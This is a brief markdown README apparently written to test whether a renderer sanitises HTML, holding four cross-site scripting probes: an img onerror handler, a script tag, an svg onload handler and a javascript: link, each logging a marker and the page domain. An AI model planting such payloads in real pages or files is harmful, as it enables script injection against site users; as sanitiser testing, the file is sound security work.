# README XSS Test

Raw HTML img: <img src=x onerror="console.log('XSS-POC-README-IMG-'+document.domain)">

Raw script tag: <script>console.log('XSS-POC-README-SCRIPT-'+document.domain)</script>

SVG onload: <svg onload="console.log('XSS-POC-README-SVG-'+document.domain)">

Markdown link javascript href: [click me](javascript:console.log('XSS-POC-README-LINK'))
